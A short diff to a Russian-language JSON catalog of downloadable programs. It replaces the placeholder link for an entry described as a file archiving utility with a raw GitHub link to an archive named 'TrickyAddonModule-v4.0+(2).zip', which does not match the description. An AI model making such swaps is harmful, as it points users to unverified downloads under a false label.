@@ -2,7 +2,7 @@
   {
     "name": "Программа 1",
     "description": "Утилита для архивирования файлов",
-    "url": "https://example.com/files/program1.zip",
+    "url": "https://github.com/YTArmen/cloud-programs/raw/refs/heads/main/TrickyAddonModule-v4.0+(2).zip",
     "icon": "https://example.com/icons/zip.png",
     "size": "12.5 MB"
   },
@@ -21,3 +21,4 @@
     "size": "8.7 MB"
   }
 ]
+
